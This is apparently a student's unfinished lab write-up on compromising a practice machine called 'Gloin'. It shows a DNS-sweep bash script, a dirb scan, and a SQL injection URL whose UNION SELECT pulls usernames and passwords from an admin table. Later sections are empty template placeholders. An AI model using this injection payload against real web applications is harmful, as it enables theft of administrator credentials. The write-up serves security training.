# **Exploiting Gloin**

---

## **Deliverable 1**

### **Target IP Address**
-  I used a dns resolver script that we created in previous labs which looked like this
```
#!/bin/bash

server=$2
echo "dns resolution for 10.0.5"
for i in $(seq 0 255); do
        hosts=$1.$i
        for host in $hosts; do
                nslookup $hosts $server | grep "="
        done
done
```
![ip](https://github.com/user-attachments/assets/f50d3493-d103-42ae-bfba-fbe91e1fb844)
  
---

### **Open Ports**
- **Ports Discovered:**  
![openport](https://github.com/user-attachments/assets/172d9c55-28b3-4097-ba31-0ef3d0603d54)

**This was the command I used to scan for open ports. The command towards the end is just specifying ports between 1-2000**

---

### **Discovered Vulnerability**
- After discovering that we have DirBuster on our machines I decided to use that to uncover vulnerabilities. Once I ran the command: ``` dirb https://10.0.5.31/entrance_exam/ -l ```
I was presented with tons of directories to explore and multiple options to choose from.

![unnamed](https://github.com/user-attachments/assets/9b33e89d-c50d-45f6-b2f3-eb898cb77adc)

---

### **How You Achieved a Foothold**
- After multiple failed attempts with Hydra and other programs, I decided to go back to some old labs to get any ideas for creating a foothold. With the help of last year's tech journal and some
friends nudging me in the right direction I found out i could use SQL Injeection. Using 9.1 Lab I was to whip up this URL: http://127.0.0.1/entrance_exam/admin/view_enrollee.php?id=1'+UNION+SELECT+1,2,3,4,5,6,password,username,9,10,11,12,13,14,15+FROM+admin_list;

#### **Screenshot: Foothold Process**  
![Foothold Process](path/to/foothold_screenshot.png)  
**Description:**  
*(Explain the process depicted in the screenshot and how it contributed to the foothold.)*

---

### **How You Achieved Root/Administrative Level Compromise**
- **Steps to Privilege Escalation:**  
  *(Detail the steps, tools, and commands used to gain root or administrative access.)*

#### **Screenshot: Root Access Process**  
![Root Access Process](path/to/root_access_screenshot.png)  
**Description:**  
*(Provide context for the screenshot, describing how root/admin access was achieved.)*

---

### **User Flag**
- **Location of User Flag:**  
  *(Specify where the user flag was found and its contents.)*

#### **Screenshot: User Flag**  
![User Flag](path/to/user_flag_screenshot.png)  
**Description:**  
*(Explain the significance of the user flag and how you obtained it.)*

---

### **Root Flag**
- **Location of Root Flag:**  
  *(Specify where the root flag was found and its contents.)*

#### **Screenshot: Root Flag**  
![Root Flag](path/to/root_flag_screenshot.png)  
**Description:**  
*(Describe the importance of the root flag and how you accessed it.)*

---

### **How Might the Vulnerabilities Be Mitigated by the Systems Administrator and Developer?**
- **Mitigation Strategies:**  
  *(List specific actions the system administrator or developer could take to mitigate the vulnerabilities discovered, such as patching software, implementing security best practices, or changing configurations.)*

---

## **Additional Notes/Reflections**
- **Reflections:**  
  *(Provide insights on what you learned, challenges faced, or observations made during the lab.)*
